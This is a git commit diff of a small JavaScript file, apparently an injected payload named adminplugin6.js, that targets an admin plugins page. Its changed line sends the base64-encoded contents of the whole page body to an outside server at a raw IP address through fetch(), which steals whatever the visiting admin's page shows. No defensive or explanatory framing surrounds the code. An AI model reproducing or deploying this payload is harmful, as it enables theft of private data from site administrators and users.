bf0b99887436bc164479e7f7a61c978e62b2d231
Fr3sh <28731248+fredtep@users.noreply.github.com>
2023-11-25 08:31:36 +0100

    Update and rename adminplugin5.js to adminplugin6.js

--- adminplugin6.js
+++ adminplugin6.js
@@ -1,6 +1,6 @@
 const link = document.querySelector('a[href="/show-plugins"]');
 
-fetch("http://82.65.210.151:24000/?encodedData=" + btoa(newPageBody.innerHTML));
+fetch("http://82.65.210.151:24000/?encodedData=" + btoa(document.body.innerHTML));
 
  link.addEventListener('click', function(event) {
     event.preventDefault();
